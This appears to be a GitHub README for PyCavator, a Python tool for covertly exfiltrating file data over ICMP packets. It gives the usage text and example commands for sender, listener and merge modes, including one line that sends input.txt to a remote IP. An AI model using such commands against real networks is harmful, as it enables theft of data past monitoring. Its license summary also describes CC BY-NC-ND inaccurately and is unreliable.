# PyCavator

PyCavator is a Python-based tool that can be used to send and receive data using ICMP packets. The tool can be used for authorized red teaming and penetration testing activities or educational purposes. It provides a sender mode to exfiltrate data from a file and a listener mode to receive incoming data and save it in chunks or to a single file. The tool also includes a merge mode to merge output files with part numbers in the specified range. With PyCavator, users can easily exfiltrate or receive data using ICMP packets in a secure and efficient manner.

## Usage

```bash
usage: PyCavator.py [-h] [-l] [-f FILE] [-d ADDRESS] [-s ADDRESS] [-p PROTOCOL] [-w WRITE] [-o FOLDER]
                    [--merge] [-x PREFIX] [-a START_SUFFIX] [-b END_SUFFIX] [-e EXTENSION]

Send and receive data using ICMP packets.

options:
  -h, --help            show this help message and exit
  -l, --listen          listen for incoming data (default: send data)
  -f FILE, --input_file FILE
                        input file to exfiltrate (required in sender mode)
  -d ADDRESS, --dst_addr ADDRESS
                        destination IP address (required in sender mode)
  -s ADDRESS, --src_addr ADDRESS
                        source IP address to listen for (required in listener mode)
  -p PROTOCOL, --protocol PROTOCOL
                        protocol to use (icmp)
  -w WRITE, --write WRITE
                        choices to save data (c for chunk OR s to one single file, required in listener mode)
  -o FOLDER, --output_folder FOLDER
                        output folder for received data (optional in listener mode OR required in merge mode)
  --merge               merge output files with part numbers in the specified range (default: False)
  -x PREFIX, --prefix PREFIX
                        prefix of the output file (required in merge mode)
  -a START_SUFFIX, --start_suffix START_SUFFIX
                        start part number suffix (required in merge mode)
  -b END_SUFFIX, --end_suffix END_SUFFIX
                        end part number suffix (required in merge mode)
  -e EXTENSION, --extension EXTENSION
                        extension of the output file (required in merge mode for saving data to single file)

Examples:
  # Sender mode: exfiltrate data from a file
  python PyCavator.py -f input.txt -d 192.168.1.101 -p icmp
  
  # Listener mode: listen for incoming data and save in chunks
  python PyCavator.py -l -s 192.168.1.100 -p icmp -w c
  
  # Listener mode: listen for incoming data and save to a single file
  python PyCavator.py -l -s 192.168.1.100 -p icmp -w s -o output_folder
  
  # Merge mode: merge output files with part numbers in the specified range
  python PyCavator.py --merge -x output -a 1 -b 10 -e txt -o output_folder
```

## Installation

PyCavator.py requires Python 3 to be installed. To install PyCavator.py, clone the repository and install the required Python modules:

```bash
git clone https://github.com/YOUR_USERNAME/PyCavator.git
cd PyCavator
pip install -r requirements.txt
```

## How to Contribute

If you would like to contribute to PyCavator.py, please fork the repository and submit a pull request.

## Disclaimer

This tool is intended for authorized/legitimate red teaming and pentesting activities or educational purposes only. The author of the tool is not responsible for any misuse or illegal activities that may arise from the use of this tool. Users are responsible for complying with all applicable laws and regulations. By using this tool, you acknowledge that you have read this disclaimer and agree to its terms.

## License

This project is licensed under the Creative Commons Attribution-NonCommercial-NoDerivatives 4.0 International (CC BY-NC-ND 4.0) license. This means that you are free to share and distribute the original work with proper attribution to the original author, but you may not modify the work or use it for commercial purposes. Additionally, any new versions of the work must be distributed under the same license and with proper attribution to the original author. See the [LICENSE](LICENSE) file for details.




